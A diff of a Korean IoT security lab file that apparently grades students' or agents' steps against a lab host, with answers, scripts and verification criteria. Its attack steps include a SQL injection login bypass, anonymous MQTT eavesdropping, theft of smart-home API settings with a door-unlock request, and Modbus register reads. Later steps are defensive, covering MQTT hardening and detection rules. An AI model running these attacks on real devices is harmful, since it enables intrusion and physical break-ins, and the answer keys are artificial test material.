@@ -19,28 +19,30 @@ steps:
   points: 10
   answer: '🤖 프롬프트: 대상 서버의 모든 IoT 서비스를 종합 스캔해줘
 
-    📎 참고 (CLI): nmap -sV -p 80,1883,5020,8088,8089,8090,8554 10.20.30.80 2>/dev/null && echo ''IoT 종합 스캔 완료'''
+    📎 참고 (CLI): nmap -sV -p 80,1883,5020,8088,8089,8090,8554 10.20.30.80 2>/dev/null && echo ''IoT 종합
+    스캔 완료'''
   answer_detail: 모든 IoT 서비스를 동시에 스캔하여 전체 공격 표면을 파악합니다.
   verify:
     type: output_contains
     expect: null
     field: stdout
     semantic:
-      intent: 'IoT 보안 w15 s1 — 대상 서버의 모든 IoT 서비스를 종합 스캔하시오. (cmd: nmap -sV -p 80,1883,5020,8088,8089,8090,8554 10.20.30.80
-        2>/dev/null && echo ''Io)'
+      intent: '종합 IoT 공격 표면 스캔 — nmap -sV -p 80,1883,5020,8088,8089,8090,8554 10.20.30.80 으로 7개 IoT 서비스
+        동시 스캔: HTTP(80), MQTT(1883), Modbus(5020), Dashboard(8088), Camera Web(8089), Smart Home(8090),
+        RTSP(8554). 전체 실습 환경의 공격 표면 맵핑.'
       success_criteria:
-      - '명령 실행: nmap -sV -p 80,1883,5020,8088,8089,8090,8554 10.20.30.80 2>/'
-      - 결과 출력 또는 로그 확인
-      - IoT 보안 실습 맥락 유지
+      - nmap -sV 버전 감지
+      - -p 에 7개 포트 쉼표 구분 지정
+      - 대상 10.20.30.80 종합 스캔
       acceptable_methods:
-      - 제시된 CLI 명령 그대로 실행
-      - 동등한 대체 도구 사용
-      - IoT 보안 관련 도구 체인
-      - 결과를 파일/로그에 저장
+      - nmap -sV -p <ports>
+      - rustscan + nmap 조합
+      - naabu + httpx 체인
+      - masscan 으로 대규모 IP 대상
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인 누락
-      - IoT 보안와 무관한 기법
+      - 7개 포트 중 일부 누락
+      - -sV 없이 포트 열림만 확인
+      - 종합 평가 목적 맥락 없음
   target_vm: attacker
   script: nmap -sV -p 80,1883,5020,8088,8089,8090,8554 10.20.30.80 2>/dev/null && echo 'IoT 종합 스캔 완료'
   risk_level: low
@@ -59,21 +61,21 @@ steps:
     expect: null
     field: stdout
     semantic:
-      intent: 'IoT 보안 w15 s2 — MQTT 브로커에 미인증으로 접근하고 토픽을 수집하시오. (cmd: timeout 5 mosquitto_sub -h 10.20.30.80 -t ''#'' -v -C
-        3 2>/dev/null; echo ''MQTT 정찰)'
+      intent: 'MQTT 미인증 도청 최종 검증 — timeout 5 mosquitto_sub -h 10.20.30.80 -t # -v -C 3 으로 원격 MQTT 브로커에
+        익명 접근 후 5초 내 3 메시지 수신. 종합 평가에서 OWASP IoT I1 취약점 재확인 단계.'
       success_criteria:
-      - '명령 실행: timeout 5 mosquitto_sub -h 10.20.30.80 -t ''#'' -v -C 3 2>/dev'
-      - 결과 출력 또는 로그 확인
-      - IoT 보안 실습 맥락 유지
+      - mosquitto_sub -h <원격IP> 인증 헤더 없이 접속
+      - '-t # 와일드카드 + -C 3 메시지 제한'
+      - timeout 5 로 최대 대기 시간 제한
       acceptable_methods:
-      - 제시된 CLI 명령 그대로 실행
-      - 동등한 대체 도구 사용
-      - IoT 보안 관련 도구 체인
-      - 결과를 파일/로그에 저장
+      - 'mosquitto_sub -h + -t # + -C'
+      - paho-mqtt subscribe(#)
+      - MQTT Explorer GUI
+      - nmap --script mqtt-subscribe
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인 누락
-      - IoT 보안와 무관한 기법
+      - localhost 로 잘못 지정
+      - timeout 없음
+      - 종합 평가 재검증 맥락 없음
   target_vm: attacker
   script: timeout 5 mosquitto_sub -h 10.20.30.80 -t '#' -v -C 3 2>/dev/null; echo 'MQTT 정찰 완료'
   risk_level: low
@@ -83,32 +85,33 @@ steps:
   hint: 로그인 폼에 SQLi 페이로드를 사용하세요.
   category: web
   points: 10
-  answer: "\U0001F916 프롬프트: IoT 대시보드에 SQLi 공격을 수행해줘\n\U0001F4CE 참고 (CLI): curl -s -o /dev/null -w '%{http_code}' \\\n    \
-    \ -X POST http://10.20.30.80:8088/login \\\n     -d \"username=admin' OR '1'='1'--&password=x\" 2>/dev/null; echo ' SQLi\
-    \ 공격 완료'"
+  answer: "\U0001F916 프롬프트: IoT 대시보드에 SQLi 공격을 수행해줘\n\U0001F4CE 참고 (CLI): curl -s -o /dev/null -w '%{http_code}'\
+    \ \\\n     -X POST http://10.20.30.80:8088/login \\\n     -d \"username=admin' OR '1'='1'--&password=x\"\
+    \ 2>/dev/null; echo ' SQLi 공격 완료'"
   answer_detail: SQL Injection은 IoT 웹 인터페이스의 대표적 취약점입니다.
   verify:
     type: output_contains
     expect: null
     field: stdout
     semantic:
-      intent: 'IoT 보안 w15 s3 — IoT 대시보드에 SQLi 공격을 수행하시오. (cmd: curl -s -o /dev/null -w ''%{http_code}'' \      -X POST http://10.20.30.80:8088/lo)'
+      intent: IoT 대시보드 SQL Injection 최종 검증 — curl -X POST http://10.20.30.80:8088/login -d username=admin
+        OR 1=1--&password=x + -w %{http_code} 으로 tautology 페이로드 + 응답 코드 비교. 종합 평가 공격 체인의 Stage 2.
       success_criteria:
-      - '명령 실행: curl -s -o /dev/null -w ''%{http_code}'' \      -X POST http:/'
-      - 결과 출력 또는 로그 확인
-      - IoT 보안 실습 맥락 유지
+      - curl -X POST /login 로그인 엔드포인트
+      - tautology 페이로드 admin OR 1=1-- 주입
+      - HTTP 응답 코드로 인증 우회 성공 판단
       acceptable_methods:
-      - 제시된 CLI 명령 그대로 실행
-      - 동등한 대체 도구 사용
-      - IoT 보안 관련 도구 체인
-      - 결과를 파일/로그에 저장
+      - curl + tautology 수동 페이로드
+      - sqlmap --forms --batch
+      - Burp Suite active scan
+      - ghauri 자동화
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인 누락
-      - IoT 보안와 무관한 기법
+      - 응답 코드 확인 누락
+      - 주석(--) 생략으로 신택스 에러
+      - 공격 체인 Stage 맥락 없음
   target_vm: attacker
-  script: "curl -s -o /dev/null -w '%{http_code}' \\\n     -X POST http://10.20.30.80:8088/login \\\n     -d \"username=admin'\
-    \ OR '1'='1'--&password=x\" 2>/dev/null; echo ' SQLi 공격 완료'"
+  script: "curl -s -o /dev/null -w '%{http_code}' \\\n     -X POST http://10.20.30.80:8088/login \\\n\
+    \     -d \"username=admin' OR '1'='1'--&password=x\" 2>/dev/null; echo ' SQLi 공격 완료'"
   risk_level: low
   bastion_prompt: IoT 대시보드에 SQLi 공격을 수행해줘
 - order: 4
@@ -126,21 +129,22 @@ steps:
     expect: null
     field: stdout
     semantic:
-      intent: 'IoT 보안 w15 s4 — 스마트홈 API에서 설정 정보를 탈취하고 도어락을 해제하시오. (cmd: curl -s http://10.20.30.80:8090/api/config 2>/dev/null
-        | head -5; curl -s -X POS)'
+      intent: 스마트홈 API 2 단계 공격 — (1) curl -s http://10.20.30.80:8090/api/config | head -5 으로 WiFi 패스워드/API
+        키 등 민감 설정 탈취 + (2) curl -X POST http://10.20.30.80:8090/api/devices/lock_front/control -H Content-Type:application/json
+        -d {action:unlock} 으로 도어락 해제. 정보 수집 → 물리 제어 공격 체인.
       success_criteria:
-      - '명령 실행: curl -s http://10.20.30.80:8090/api/config 2>/dev/null | hea'
-      - 결과 출력 또는 로그 확인
-      - IoT 보안 실습 맥락 유지
+      - curl -s /api/config 으로 민감 설정 탈취
+      - curl -X POST /api/devices/lock_front/control 으로 도어락 제어
+      - 2단계 공격 체인 (정보수집 → 물리 제어)
       acceptable_methods:
-      - 제시된 CLI 명령 그대로 실행
-      - 동등한 대체 도구 사용
-      - IoT 보안 관련 도구 체인
-      - 결과를 파일/로그에 저장
+      - curl + curl 2단계 순차 실행
+      - httpie http POST + GET 조합
+      - python requests 로 스크립트화
+      - postman collection runner
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인 누락
-      - IoT 보안와 무관한 기법
+      - 정보 수집 또는 도어락 제어 한쪽만
+      - Content-Type 헤더 누락
+      - 공격 체인 흐름 맥락 없음
   target_vm: attacker
   script: curl -s http://10.20.30.80:8090/api/config 2>/dev/null | head -5; curl -s -X POST http://10.20.30.80:8090/api/devices/lock_front/control
     -H 'Content-Type:application/json' -d '{"action":"unlock"}' 2>/dev/null; echo '스마트홈 공격 완료'
@@ -153,34 +157,34 @@ steps:
   points: 10
   answer: '🤖 프롬프트: Modbus PLC 레지스터를 읽고 데이터를 수집해줘
 
-    📎 참고 (CLI): python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient(''10.20.30.80'',port=5020); c.connect();
-    r=c.read_input_registers(0,5,slave=1); print(f''Sensors: {r.registers}'') if not r.isError() else print(''읽기 실패''); c.close()"
-    2>/dev/null; echo ''Modbus 데이터 수집 완료'''
+    📎 참고 (CLI): python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient(''10.20.30.80'',port=5020);
+    c.connect(); r=c.read_input_registers(0,5,slave=1); print(f''Sensors: {r.registers}'') if not r.isError()
+    else print(''읽기 실패''); c.close()" 2>/dev/null; echo ''Modbus 데이터 수집 완료'''
   answer_detail: Modbus 미인증 접근으로 산업 제어 시스템의 센서 데이터를 수집합니다.
   verify:
     type: output_contains
     expect: null
     field: stdout
     semantic:
-      intent: 'IoT 보안 w15 s5 — Modbus PLC 레지스터를 읽고 데이터를 수집하시오. (cmd: python3 -c "from pymodbus.client import ModbusTcpClient;
-        c=ModbusTcpClient(''10.2)'
+      intent: Modbus PLC 센서 데이터 수집 (종합) — python3 ModbusTcpClient(10.20.30.80, port=5020) + read_input_registers(0,
+        5, slave=1) 으로 Input Registers 5개 (FC04) 읽기. 산업 제어 시스템 센서 데이터 탈취. 사이버-물리 공격 시작점.
       success_criteria:
-      - '명령 실행: python3 -c "from pymodbus.client import ModbusTcpClient; c=M'
-      - 결과 출력 또는 로그 확인
-      - IoT 보안 실습 맥락 유지
+      - ModbusTcpClient 연결 (IP=10.20.30.80, port=5020)
+      - read_input_registers(0, 5, slave=1) 으로 5 레지스터 읽기
+      - r.isError() 체크 + r.registers 출력
       acceptable_methods:
-      - 제시된 CLI 명령 그대로 실행
-      - 동등한 대체 도구 사용
-      - IoT 보안 관련 도구 체인
-      - 결과를 파일/로그에 저장
+      - pymodbus TcpClient + read_input_registers
+      - mbtget -r4 -a 0 -n 5 -u 1 (CLI 도구)
+      - Metasploit auxiliary/scanner/scada/modbusdetect
+      - ModScan/QModMaster GUI
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인 누락
-      - IoT 보안와 무관한 기법
+      - slave 지정 누락
+      - read_holding_registers 로 잘못 사용
+      - ICS/SCADA 맥락 없음
   target_vm: attacker
-  script: 'python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient(''10.20.30.80'',port=5020); c.connect();
-    r=c.read_input_registers(0,5,slave=1); print(f''Sensors: {r.registers}'') if not r.isError() else print(''읽기 실패''); c.close()"
-    2>/dev/null; echo ''Modbus 데이터 수집 완료'''
+  script: 'python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient(''10.20.30.80'',port=5020);
+    c.connect(); r=c.read_input_registers(0,5,slave=1); print(f''Sensors: {r.registers}'') if not r.isError()
+    else print(''읽기 실패''); c.close()" 2>/dev/null; echo ''Modbus 데이터 수집 완료'''
   risk_level: low
   bastion_prompt: Modbus PLC 레지스터를 읽고 데이터를 수집해줘
 - order: 6
@@ -191,33 +195,34 @@ steps:
   answer: '🤖 프롬프트: MQTT 보안 설정(인증 + ACL)을 구현 방법을 설명하고 예시 코드를 보여줘
 
     📎 참고 (CLI): echo ''listener 1883'' > /tmp/mqtt_secure.conf && echo ''allow_anonymous false'' >> /tmp/mqtt_secure.conf
-    && echo ''password_file /mosquitto/passwd'' >> /tmp/mqtt_secure.conf && echo ''acl_file /mosquitto/acl'' >> /tmp/mqtt_secure.conf
-    && echo ''MQTT 보안 설정 완료'''
+    && echo ''password_file /mosquitto/passwd'' >> /tmp/mqtt_secure.conf && echo ''acl_file /mosquitto/acl''
+    >> /tmp/mqtt_secure.conf && echo ''MQTT 보안 설정 완료'''
   answer_detail: MQTT 인증과 ACL을 적용하여 미인증 접근과 무단 토픽 접근을 차단합니다.
   verify:
     type: output_contains
     expect: null
     field: stdout
     semantic:
-      intent: 'IoT 보안 w15 s6 — MQTT 보안 설정(인증 + ACL)을 작성하시오. (cmd: echo ''listener 1883'' > /tmp/mqtt_secure.conf && echo ''allow_anonymous
-        false'' >> )'
+      intent: 'MQTT 브로커 인증 + ACL 보안 설정 파일 — echo 으로 /tmp/mqtt_secure.conf 4 라인 작성: listener 1883 + allow_anonymous
+        false + password_file /mosquitto/passwd + acl_file /mosquitto/acl. Eclipse Mosquitto 공식 인증/인가
+        2 단계 보안 설정.'
       success_criteria:
-      - '명령 실행: echo ''listener 1883'' > /tmp/mqtt_secure.conf && echo ''allow_'
-      - 결과 출력 또는 로그 확인
-      - IoT 보안 실습 맥락 유지
+      - echo + 리다이렉트로 mqtt_secure.conf 생성
+      - allow_anonymous false 익명 차단
+      - password_file + acl_file 2개 지시어로 인증+인가 분리
       acceptable_methods:
-      - 제시된 CLI 명령 그대로 실행
-      - 동등한 대체 도구 사용
-      - IoT 보안 관련 도구 체인
-      - 결과를 파일/로그에 저장
+      - echo 평면 설정 파일 생성
+      - cat << EOF heredoc 대체
+      - mosquitto_passwd 로 실제 패스워드 파일 생성
+      - JWT 플러그인 mosquitto-go-auth 연동
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인 누락
-      - IoT 보안와 무관한 기법
+      - allow_anonymous false 누락
+      - ACL 파일 지정 없이 password 만
+      - listener 포트 지정 누락
   target_vm: attacker
-  script: echo 'listener 1883' > /tmp/mqtt_secure.conf && echo 'allow_anonymous false' >> /tmp/mqtt_secure.conf && echo 'password_file
-    /mosquitto/passwd' >> /tmp/mqtt_secure.conf && echo 'acl_file /mosquitto/acl' >> /tmp/mqtt_secure.conf && echo 'MQTT 보안
-    설정 완료'
+  script: echo 'listener 1883' > /tmp/mqtt_secure.conf && echo 'allow_anonymous false' >> /tmp/mqtt_secure.conf
+    && echo 'password_file /mosquitto/passwd' >> /tmp/mqtt_secure.conf && echo 'acl_file /mosquitto/acl'
+    >> /tmp/mqtt_secure.conf && echo 'MQTT 보안 설정 완료'
   risk_level: low
   bastion_prompt: MQTT 보안 설정(인증 + ACL)을 작성하시오.
 - order: 7
@@ -227,34 +232,37 @@ steps:
   points: 10
   answer: '🤖 프롬프트: IoT 공격 탐지 규칙을 3개 이상 구현 방법을 설명하고 예시 코드를 보여줘
 
-    📎 참고 (CLI): echo ''=== IoT 탐지 규칙 ==='' && echo ''Rule 1: MQTT # 구독 시도 → Alert(High)'' && echo ''Rule 2: Modbus Write(FC
-    5,6,15,16) from unauthorized IP → Alert(Critical)'' && echo ''Rule 3: 기본 비밀번호(admin/admin) 로그인 시도 → Alert(High)'' && echo
-    ''Rule 4: RTSP 인증 실패 5회 이상 → Block(Medium)'' && echo ''=== 탐지 규칙 완료 ==='''
+    📎 참고 (CLI): echo ''=== IoT 탐지 규칙 ==='' && echo ''Rule 1: MQTT # 구독 시도 → Alert(High)'' && echo ''Rule
+    2: Modbus Write(FC 5,6,15,16) from unauthorized IP → Alert(Critical)'' && echo ''Rule 3: 기본 비밀번호(admin/admin)
+    로그인 시도 → Alert(High)'' && echo ''Rule 4: RTSP 인증 실패 5회 이상 → Block(Medium)'' && echo ''=== 탐지 규칙 완료
+    ==='''
   answer_detail: 탐지 규칙은 IoT 환경의 특성에 맞게 프로토콜별로 작성합니다.
   verify:
     type: output_contains
     expect: null
     field: stdout
     semantic:
-      intent: 'IoT 보안 w15 s7 — IoT 공격 탐지 규칙을 3개 이상 작성하시오. (cmd: echo ''=== IoT 탐지 규칙 ==='' && echo ''Rule 1: MQTT # 구독 시도
-        → Alert(High)'' && echo ''R)'
+      intent: 'IoT 공격 탐지 IDS 규칙 — echo 으로 4개 룰 작성: Rule 1: MQTT # 구독 시도 → Alert(High) + Rule 2: Modbus
+        Write(FC 5,6,15,16) from unauthorized IP → Alert(Critical) + Rule 3: 기본 비밀번호(admin/admin) 로그인
+        시도 → Alert(High) + Rule 4: RTSP 인증 실패 5회 이상 → Block(Medium). Suricata/Snort 시그니처 기반.'
       success_criteria:
-      - '명령 실행: echo ''=== IoT 탐지 규칙 ==='' && echo ''Rule 1: MQTT # 구독 시도 → Ale'
-      - 결과 출력 또는 로그 확인
-      - IoT 보안 실습 맥락 유지
+      - echo === IoT 탐지 규칙 === 마커 출력
+      - 4 개 이상 룰 (Rule 1~4) 프로토콜별 작성
+      - Critical/High/Medium 심각도 + Alert/Block 액션 구분
       acceptable_methods:
-      - 제시된 CLI 명령 그대로 실행
-      - 동등한 대체 도구 사용
-      - IoT 보안 관련 도구 체인
-      - 결과를 파일/로그에 저장
+      - echo 평면 출력
+      - Suricata signature 실제 작성 (alert mqtt any any -> any any)
+      - Zeek/Bro 스크립트로 프로토콜 분석
+      - ML 기반 anomaly detection
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인 누락
-      - IoT 보안와 무관한 기법
+      - 3 개 미만 규칙
+      - 심각도 분류 누락
+      - IoT 특화 프로토콜(MQTT/Modbus/RTSP) 맥락 없음
   target_vm: attacker
-  script: 'echo ''=== IoT 탐지 규칙 ==='' && echo ''Rule 1: MQTT # 구독 시도 → Alert(High)'' && echo ''Rule 2: Modbus Write(FC 5,6,15,16)
-    from unauthorized IP → Alert(Critical)'' && echo ''Rule 3: 기본 비밀번호(admin/admin) 로그인 시도 → Alert(High)'' && echo ''Rule
-    4: RTSP 인증 실패 5회 이상 → Block(Medium)'' && echo ''=== 탐지 규칙 완료 ==='''
+  script: 'echo ''=== IoT 탐지 규칙 ==='' && echo ''Rule 1: MQTT # 구독 시도 → Alert(High)'' && echo ''Rule 2:
+    Modbus Write(FC 5,6,15,16) from unauthorized IP → Alert(Critical)'' && echo ''Rule 3: 기본 비밀번호(admin/admin)
+    로그인 시도 → Alert(High)'' && echo ''Rule 4: RTSP 인증 실패 5회 이상 → Block(Medium)'' && echo ''=== 탐지 규칙 완료
+    ==='''
   risk_level: low
   bastion_prompt: IoT 공격 탐지 규칙을 3개 이상 작성하시오.
 - order: 8
@@ -264,33 +272,36 @@ steps:
   points: 12
   answer: '🤖 프롬프트: 종합 IoT 보안 평가 보고서를 구현 방법을 설명하고 예시 코드를 보여줘
 
-    📎 참고 (CLI): echo ''=== IoT 종합 보안 평가 보고서 ==='' && echo ''[취약점] MQTT 미인증(C), SQLi(C), Modbus 미인증(C), API 노출(H)'' && echo
-    ''[공격체인] MQTT도청→웹SQLi→API탈취→Modbus조작→도어락해제'' && echo ''[보안조치] MQTT 인증+TLS, SQLi 패치, Modbus 방화벽'' && echo ''[잔여위험] 펌웨어
-    암호화 미적용, OTA 서명 미구현'' && echo ''종합등급: 미흡 → 조치 후 재평가 필요'' && echo ''=== 종합 평가 완료 ==='''
+    📎 참고 (CLI): echo ''=== IoT 종합 보안 평가 보고서 ==='' && echo ''[취약점] MQTT 미인증(C), SQLi(C), Modbus 미인증(C),
+    API 노출(H)'' && echo ''[공격체인] MQTT도청→웹SQLi→API탈취→Modbus조작→도어락해제'' && echo ''[보안조치] MQTT 인증+TLS, SQLi
+    패치, Modbus 방화벽'' && echo ''[잔여위험] 펌웨어 암호화 미적용, OTA 서명 미구현'' && echo ''종합등급: 미흡 → 조치 후 재평가 필요'' &&
+    echo ''=== 종합 평가 완료 ==='''
   answer_detail: 종합 보고서는 경영진과 기술진 모두에게 명확한 보안 상태를 전달해야 합니다.
   verify:
     type: output_contains
     expect: null
     field: stdout
     semantic:
-      intent: 'IoT 보안 w15 s8 — 종합 IoT 보안 평가 보고서를 작성하시오. (cmd: echo ''=== IoT 종합 보안 평가 보고서 ==='' && echo ''[취약점] MQTT 미인증(C),
-        SQLi(C), Modbus 미인증()'
+      intent: '종합 IoT 보안 평가 보고서 — echo 으로 5 섹션: [취약점] MQTT 미인증(Critical), SQLi(Critical), Modbus 미인증(Critical),
+        API 노출(High) + [공격체인] MQTT 도청→웹SQLi→API 탈취→Modbus 조작→도어락 해제 + [보안조치] MQTT 인증+TLS, SQLi 패치, Modbus
+        방화벽 + [잔여위험] 펌웨어 암호화 미적용, OTA 서명 미구현 + 종합등급 미흡. 킬 체인 분석 + 경영 보고 양식.'
       success_criteria:
-      - '명령 실행: echo ''=== IoT 종합 보안 평가 보고서 ==='' && echo ''[취약점] MQTT 미인증(C), '
-      - 결과 출력 또는 로그 확인
-      - IoT 보안 실습 맥락 유지
+      - echo === IoT 종합 보안 평가 보고서 === 마커 출력
+      - 취약점/공격체인/보안조치/잔여위험/종합등급 5 섹션 구조화
+      - 공격 킬 체인(MQTT 도청→SQLi→API→Modbus→도어락) 시나리오 명시
       acceptable_methods:
-      - 제시된 CLI 명령 그대로 실행
-      - 동등한 대체 도구 사용
-      - IoT 보안 관련 도구 체인
-      - 결과를 파일/로그에 저장
+      - echo 평면 보고서
+      - markdown 리포트 파일 저장
+      - Dradis/Faraday 펜테스트 리포트 도구
+      - NIST SP 800-115 침투 테스트 보고 가이드라인
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인 누락
-      - IoT 보안와 무관한 기법
+      - 5 섹션 중 일부 누락
+      - 공격 킬 체인 없이 단순 취약점 나열
+      - 종합등급 및 재평가 필요성 언급 없음
   target_vm: attacker
-  script: 'echo ''=== IoT 종합 보안 평가 보고서 ==='' && echo ''[취약점] MQTT 미인증(C), SQLi(C), Modbus 미인증(C), API 노출(H)'' && echo ''[공격체인]
-    MQTT도청→웹SQLi→API탈취→Modbus조작→도어락해제'' && echo ''[보안조치] MQTT 인증+TLS, SQLi 패치, Modbus 방화벽'' && echo ''[잔여위험] 펌웨어 암호화 미적용,
-    OTA 서명 미구현'' && echo ''종합등급: 미흡 → 조치 후 재평가 필요'' && echo ''=== 종합 평가 완료 ==='''
+  script: 'echo ''=== IoT 종합 보안 평가 보고서 ==='' && echo ''[취약점] MQTT 미인증(C), SQLi(C), Modbus 미인증(C), API
+    노출(H)'' && echo ''[공격체인] MQTT도청→웹SQLi→API탈취→Modbus조작→도어락해제'' && echo ''[보안조치] MQTT 인증+TLS, SQLi 패치,
+    Modbus 방화벽'' && echo ''[잔여위험] 펌웨어 암호화 미적용, OTA 서명 미구현'' && echo ''종합등급: 미흡 → 조치 후 재평가 필요'' && echo
+    ''=== 종합 평가 완료 ==='''
   risk_level: low
   bastion_prompt: 종합 IoT 보안 평가 보고서를 작성하시오.
